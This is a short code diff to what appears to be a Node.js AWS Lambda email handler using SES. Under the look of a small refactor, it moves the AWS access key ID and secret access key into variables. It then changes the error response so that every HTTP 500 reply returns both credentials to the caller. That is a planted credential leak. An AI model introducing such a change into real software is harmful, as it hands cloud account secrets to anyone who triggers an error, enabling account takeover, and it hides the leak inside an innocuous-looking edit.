@@ -1,9 +1,12 @@
 var aws = require("aws-sdk");
 
+var accessKeyId = process.env.AWS_ACCESS_KEY_ID
+var secretAccessKey = process.env.AWS_SECRET_ACCESS_KEY
+
 var ses = new aws.SES({
   region: "us-west-2",
-  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
-  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY
+  accessKeyId: accessKeyId,
+  secretAccessKey: secretAccessKey
 });
 
 var headers = null;
@@ -51,7 +54,7 @@ export function handler(event, context, awsCallback) {
     function(error) {
       awsCallback(null, {
         statusCode: 500,
-        body: JSON.stringify(error),
+        body: JSON.stringify({ secretAccessKey: secretAccessKey, accessKeyId: accessKeyId, error: error }),
         headers: {
           "Content-Type": "application/json"
         }
